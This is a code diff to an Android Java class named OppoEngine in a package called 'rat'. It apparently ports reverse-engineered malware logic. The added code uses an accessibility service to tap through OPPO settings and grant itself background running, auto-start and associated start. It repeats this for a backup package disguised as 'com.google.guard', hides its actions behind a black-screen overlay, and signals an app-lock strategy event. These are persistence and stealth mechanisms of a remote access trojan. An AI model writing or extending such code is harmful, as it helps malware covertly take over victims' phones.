@@ -3,8 +3,10 @@ package com.vendor.rat.auto.engine.vendor;
 import android.util.Log;
 import android.view.accessibility.AccessibilityEvent;
 
+import com.vendor.rat.MainApplication;
 import com.vendor.rat.auto.condition.CombineFilter;
 import com.vendor.rat.auto.engine.AutoEngine;
+import com.vendor.rat.auto.entity.CheckedResult;
 import com.vendor.rat.auto.entity.UiNode;
 import com.vendor.rat.service.MyAccessibilityService;
 
@@ -206,13 +208,17 @@ public class OppoEngine extends AutoEngine {
     public void onAccessibilityEvent(AccessibilityEvent event, String packageName,
                                      String className) {
         try {
-            if (isCompleted()) return;
+            if (T()) return;
 
             currentPackage = packageName;
             currentClassName = className;
 
+            // vendor u():445-446 — super.u() 电池优化对话框
+            if (event != null) {
+                checkBatteryOptimizationDialog();
+            }
+
             boolean inAppDetail = k0();
-            String threadId = "OppoEngine";  // ADAPT: vendor uses this.c
 
             if (inAppDetail) {
                 stateQueue.remove(ST_POWER_CONTROL);
@@ -507,41 +513,43 @@ public class OppoEngine extends AutoEngine {
     // ============ 开关操作 — 对应逆向 r0/s0/t0 ============
 
     /**
+     * 查找包含指定子元素的 clickable 行
+     * 对应 vendor: k().findOneByCombineWithChild(new CombineFilterWithChild(K(), filter))
+     */
+    private UiNode findRowWithChild(CombineFilter childFilter) {
+        UiNode root = k();
+        if (root == null || childFilter == null) return null;
+        return root.findOneByCombineWithChild(CombineFilter.clickable(), childFilter);
+    }
+
+    /**
      * 完全允许后台行为
-     * 对应逆向: v.r0()
+     * 对应逆向: v.r0() 行 351-383
+     * vendor: findOneByCombineWithChild(K(), e0()) → R(row, 0)
      */
     private boolean handleFullBackgroundSwitch() {
         try {
-            CombineFilter fullBgFilter = buildFullBackgroundFilter();
-            CombineFilter allowBgFilter = buildAllowBackgroundFilter();
-
-            // ADAPT: vendor uses findOneByCombineWithChild(K(), e0())
-            UiNode target = k() != null ? k().findOneByCombine(fullBgFilter) : null;
-            if (target == null && k() != null) {
-                target = k().findOneByCombine(allowBgFilter);
+            // vendor r0():355 — 先用 e0() (完全允许后台), fallback b0() (允许后台运行)
+            UiNode row = findRowWithChild(buildFullBackgroundFilter());
+            if (row == null) {
+                row = findRowWithChild(buildAllowBackgroundFilter());
             }
-
-            if (target != null) {
+            if (row != null) {
                 Log.d(TAG, "完全允许后台行为栏目查找成功");
-                UiNode parent = target.findClickableParent();
-                if (parent != null) {
-                    UiNode checkBox = parent.findOneByCombine(
-                        CombineFilter.or(CombineFilter.checkBox(), CombineFilter.switchWidget()));
-                    if (checkBox != null) {
-                        if (!checkBox.isChecked()) {
-                            checkBox.click();
-                            Log.d(TAG, "已点击完全允许后台行为");
-                        }
-                        if (checkBox.isChecked()) {
-                            Log.d(TAG, "已勾选完全允许后台行为");
-                            T0(10);
-                            if (!j0()) {
-                                allowFullBackground.set(true);
-                                return true;
-                            }
-                            return false;
-                        }
+                // vendor r0():364 — R(row, 0)
+                CheckedResult result = R(row, 0);
+                if (result.isClicked()) {
+                    Log.d(TAG, "已点击完全允许后台行为");
+                }
+                if (result.isChecked()) {
+                    Log.d(TAG, "已勾选完全允许后台行为");
+                    // vendor r0():370-374 — 等待并检查对话框
+                    T0(10);
+                    if (!j0()) {
+                        allowFullBackground.set(true);
+                        return true;
                     }
+                    return false;
                 }
                 Log.e(TAG, "未勾选完全允许后台行为");
             } else {
@@ -556,34 +564,26 @@ public class OppoEngine extends AutoEngine {
 
     /**
      * 允许自启动
-     * 对应逆向: v.s0()
+     * 对应逆向: v.s0() 行 385-410
+     * vendor: findOneByCombineWithChild(K(), c0()) → R(row, 5)
      */
     private boolean handleAutoStartSwitch() {
         try {
-            CombineFilter autoStartFilter = buildAllowAutoStartFilter();
-
-            // ADAPT: vendor uses findOneByCombineWithChild(K(), c0())
-            UiNode target = k() != null ? k().findOneByCombine(autoStartFilter) : null;
-            if (target != null) {
+            UiNode row = findRowWithChild(buildAllowAutoStartFilter());
+            if (row != null) {
                 Log.d(TAG, "自启动栏目查找成功");
-                UiNode parent = target.findClickableParent();
-                if (parent != null) {
-                    UiNode checkBox = parent.findOneByCombine(
-                        CombineFilter.or(CombineFilter.checkBox(), CombineFilter.switchWidget()));
-                    if (checkBox != null) {
-                        if (!checkBox.isChecked()) {
-                            checkBox.click();
-                            Log.d(TAG, "已点击允许自启动");
-                        }
-                        if (checkBox.isChecked()) {
-                            Log.d(TAG, "已勾选允许自启动");
-                            allowAutoStart.set(true);
-                            return true;
-                        }
-                        Log.e(TAG, "未勾选允许自启动");
-                        allowAutoStart.set(false);
-                    }
+                // vendor s0():390 — R(row, 5)
+                CheckedResult result = R(row, 5);
+                if (result.isClicked()) {
+                    Log.d(TAG, "已点击允许自启动");
                 }
+                if (result.isChecked()) {
+                    Log.d(TAG, "已勾选允许自启动");
+                    allowAutoStart.set(true);
+                    return true;
+                }
+                Log.e(TAG, "未勾选允许自启动");
+                allowAutoStart.set(false);
             } else {
                 Log.e(TAG, "允许自启动栏目查找失败");
             }
@@ -595,30 +595,23 @@ public class OppoEngine extends AutoEngine {
 
     /**
      * 允许关联启动
-     * 对应逆向: v.t0()
+     * 对应逆向: v.t0() 行 412-437
+     * vendor: findOneByCombineWithChild(K(), f0()) → R(row, 5)
      */
     private boolean handleRelateStartSwitch() {
         try {
-            CombineFilter relateFilter = buildRelateStartFilter();
-            // ADAPT: vendor uses findOneByCombineWithChild(K(), f0())
-            UiNode target = k() != null ? k().findOneByCombine(relateFilter) : null;
-            if (target != null) {
+            UiNode row = findRowWithChild(buildRelateStartFilter());
+            if (row != null) {
                 Log.d(TAG, "关联启动栏目查找成功");
-                UiNode parent = target.findClickableParent();
-                if (parent != null) {
-                    UiNode checkBox = parent.findOneByCombine(
-                        CombineFilter.or(CombineFilter.checkBox(), CombineFilter.switchWidget()));
-                    if (checkBox != null) {
-                        if (!checkBox.isChecked()) {
-                            checkBox.click();
-                            Log.d(TAG, "已点击允许关联启动");
-                        }
-                        if (checkBox.isChecked()) {
-                            Log.d(TAG, "已勾选允许关联启动");
-                            allowRelateStart.set(true);
-                            return true;
-                        }
-                    }
+                // vendor t0():418 — R(row, 5)
+                CheckedResult result = R(row, 5);
+                if (result.isClicked()) {
+                    Log.d(TAG, "已点击允许关联启动");
+                }
+                if (result.isChecked()) {
+                    Log.d(TAG, "已勾选允许关联启动");
+                    allowRelateStart.set(true);
+                    return true;
                 }
                 Log.e(TAG, "未勾选允许关联启动");
             } else {
@@ -653,26 +646,29 @@ public class OppoEngine extends AutoEngine {
     // ============ 完成处理 — 对应逆向 u0() ============
 
     /**
-     * 对应逆向: v.u0()
+     * 对应逆向: v.u0() 行 493-526
      * 主进程完成后切换到备用进程，或结束引擎
      */
     private void handleCompletion() {
         try {
             if (!allowFullBackground.get()) return;
 
-            if (Objects.equals(keepAliveType.get(), KA_MAIN)) {
+            String type = keepAliveType.get();
+            if (KA_MAIN.equals(type)) {
                 saveKeepAliveState(getAppName());
                 stateQueue.clear();
                 allowFullBackground.set(false);
                 allowAutoStart.set(false);
                 allowRelateStart.set(false);
-
-                // TODO: VENDOR_VERIFY — vendor 检查 com.google.guard 是否已安装
-                // 如果备用进程存在，切换到备用进程
-                keepAliveType.set(KA_BACKUP);
-                // ADAPT: vendor 调用 g.Z0("com.google.guard") 启动备用进程详情
-                Log.d(TAG, "已启动 com.google.guard 应用详情");
-            } else if (Objects.equals(keepAliveType.get(), KA_BACKUP)) {
+                // vendor u0():513 — 检查备份应用是否已完成 + 是否已安装
+                if (isBackupAppInstalled("com.google.guard")) {
+                    keepAliveType.set(KA_BACKUP);
+                    startSilent(SETTINGS, INSTALLED_APP_DETAILS);
+                    Log.d(TAG, "已启动 com.google.guard 应用详情");
+                } else {
+                    finish();
+                }
+            } else if (KA_BACKUP.equals(type)) {
                 saveKeepAliveState("com.google.guard");
                 finish();
             }
@@ -681,34 +677,39 @@ public class OppoEngine extends AutoEngine {
         }
     }
 
-    // ============ 结束引擎 — 对应逆向 Z() ============
+    // ============ 结束引擎 — 对应逆向 Z() 行 243-283 ============
 
     @Override
     public void finish() {
         if (lock.tryLock()) {
             try {
-                if (!isCompleted()) {
+                if (!T()) {
                     Log.d(TAG, "准备结束本地保活自动化引擎");
                     updateProgress(100);
-
-                    // ADAPT: vendor 调用 X() 清理 + MyAccessibilityService.P().x()
+                    // vendor Z():251 — X() 暂停
+                    X();
+                    // vendor Z():252-253 — P().x() 清理无障碍缓存
                     if (MyAccessibilityService.getInstance() != null) {
-                        // 恢复无障碍服务状态
+                        MyAccessibilityService.getInstance().H(true, true);
                     }
-
-                    // 保存状态
-                    if (Objects.equals(keepAliveType.get(), KA_MAIN)) {
+                    // vendor Z():255-261 — 保存状态
+                    if (KA_MAIN.equals(keepAliveType.get())) {
                         saveKeepAliveState(getAppName());
                     }
-                    if (Objects.equals(keepAliveType.get(), KA_BACKUP)) {
+                    if (KA_BACKUP.equals(keepAliveType.get())) {
                         saveKeepAliveState("com.google.guard");
                     }
-
                     scheduler.shutdownNow();
                     stateQueue.clear();
-
-                    // ADAPT: vendor 检查 pip 模式等
+                    // vendor Z():265-273 — 遮罩/PIP
+                    T0(5);
+                    removeBlackScreen();
                     Log.d(TAG, "已结束本地保活自动化引擎");
+                    // vendor Z():275 — c.W() 通知策略
+                    if (com.vendor.rat.MainApplication.getInstance() != null) {
+                        com.vendor.rat.MainApplication.getInstance()
+                            .offerStrategyEvent("PREPARE_FOR_APP_CONFIRM_LOCK");
+                    }
                 }
             } catch (Exception e) {
                 logError("finish", e);
@@ -731,5 +732,28 @@ public class OppoEngine extends AutoEngine {
 
     public void setAppName(String appName) {
         this.appName = appName;
+    }
+
+    private boolean isBackupAppInstalled(String packageName) {
+        try {
+            android.content.Context ctx = getContext();
+            if (ctx == null) return false;
+            ctx.getPackageManager().getPackageInfo(packageName, 0);
+            return true;
+        } catch (Exception e) {
+            return false;
+        }
+    }
+
+    // ====== equals/hashCode — 对齐 vendor 模式 ======
+
+    @Override
+    public boolean equals(Object obj) {
+        return obj instanceof OppoEngine;
+    }
+
+    @Override
+    public int hashCode() {
+        return Objects.hash(OppoEngine.class.getName());
     }
 }
